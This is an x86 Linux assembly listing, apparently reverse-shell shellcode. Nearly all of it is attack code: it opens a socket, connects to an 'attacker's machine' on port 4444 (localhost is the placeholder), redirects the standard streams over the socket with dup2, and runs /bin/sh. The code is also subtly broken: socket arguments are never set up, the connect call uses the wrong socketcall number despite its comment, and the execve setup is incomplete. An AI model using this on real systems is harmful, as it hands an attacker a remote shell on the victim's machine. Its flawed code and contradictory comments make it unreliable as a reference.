; Assume socketcall is syscall number 102, SYS_CONNECT is 3, AF_INET is 2
; PF_INET is same as AF_INET, SOCK_STREAM is 1, and IPPROTO_IP is 0.

; First, you need to create a socket using the socketcall
mov eax, 102              ; syscall number for socketcall
mov ebx, 1                ; SYS_SOCKET within socketcall
lea ecx, [esp + 4]        ; pointer to arguments on the stack
int 0x80                  ; call kernel
mov edi, eax              ; save the returned socket descriptor

; Next, connect to the attacker's machine
; struct sockaddr_in {
;   short sin_family;     // e.g. AF_INET, AF_INET6
;   unsigned short sin_port;   // e.g. htons(3490)
;   struct in_addr sin_addr;   // see struct in_addr, below
;   char sin_zero[8];          // zero this if you want to
; };

push dword 0x0100007F      ; Push the IP Address to the stack (127.0.0.1 for localhost, change to attacker's IP)
push dword 0x5C110002      ; Push the port number (0x5C11 is port 4444 in network byte order) and AF_INET
mov ecx, esp               ; Save pointer to struct sockaddr

; Argument setup for the connect() call
push 16                    ; sizeof(struct sockaddr)
push ecx                   ; pointer to struct sockaddr
push edi                   ; socket descriptor
mov ecx, esp               ; pointer to arguments
mov ebx, 1                 ; SYS_CONNECT within socketcall
mov eax, 102               ; syscall number for socketcall
int 0x80                   ; call kernel

; Now to duplicate file descriptors for stdin, stdout, and stderr
dup2:
mov ecx, 2                 ; Starting with stderr
loop_dup2:
  mov eax, 63              ; syscall number for dup2
  mov ebx, edi             ; our socket descriptor
  int 0x80                 ; call kernel
  dec ecx
  jns loop_dup2            ; Loop for stdin and stdout

; Finally, execute a shell
mov eax, 11                ; syscall number for execve
push 0x00                  ; terminate array with NULL
push 0x68732F2F            ; push the string //sh in reverse (since stack is LIFO)
push 0x6E69622F            ; push the string /bin in reverse
mov ebx, esp               ; pointer to "/bin//sh\0"
push 0x00                  ; terminate array with NULL
push ebx                   ; pointer to the array ["bin//sh", NULL]
mov ecx, esp               ; pointer to the array of pointers
int 0x80                   ; call kernel

